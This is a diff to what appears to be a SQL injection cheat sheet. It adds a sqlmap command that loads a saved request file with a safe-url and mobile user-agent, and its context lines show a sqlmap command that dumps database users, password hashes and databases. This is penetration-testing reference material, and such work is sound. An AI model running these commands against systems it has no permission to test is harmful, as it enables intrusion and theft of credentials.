@@ -117,6 +117,12 @@ transformed into U+0027 APOSTROPHE (')
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 ```
 
+### Load a request file and use mobile user-agent
+
+```powershell
+sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
+```
+
 ### Custom injection in UserAgent/Header/Referer/Cookie
 
 ```powershell
